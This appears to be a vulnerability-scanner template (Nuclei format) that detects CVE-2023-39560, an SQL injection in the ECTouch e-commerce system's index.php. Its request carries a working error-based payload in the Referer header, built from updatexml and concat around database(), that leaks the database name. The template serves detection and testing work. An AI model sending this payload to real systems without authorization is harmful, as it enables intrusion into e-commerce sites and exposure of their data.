id: cve-2023-39560-ectouch-sqli

info:
  name: ECTouch E-Commerce System index.php SQL Injection
  author: ProjectDiscoveryAI
  severity: critical
  tags: CVE-2023-39560,sqli
  description: |
    This template detects a SQL injection vulnerability in the ECTouch e-commerce system's index.php page.
  classification:
    cve-id: CVE-2023-39560

http:
  - method: GET
    path:
      - "{{BaseURL}}/index.php?m=default&c=user&a=register&u=0"
    headers:
      Referer: "554fcae493e564ee0dc75bdf2ebf94cabought_notes|a:1:{s:2:\"id\";s:49:\"0&&updatexml(1,concat(0x7e,(database()),0x7e),1)#;}"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "XPATH syntax error"
          - "SQL"
      - type: regex
        part: body
        regex:
          - "'~(.*)~'"
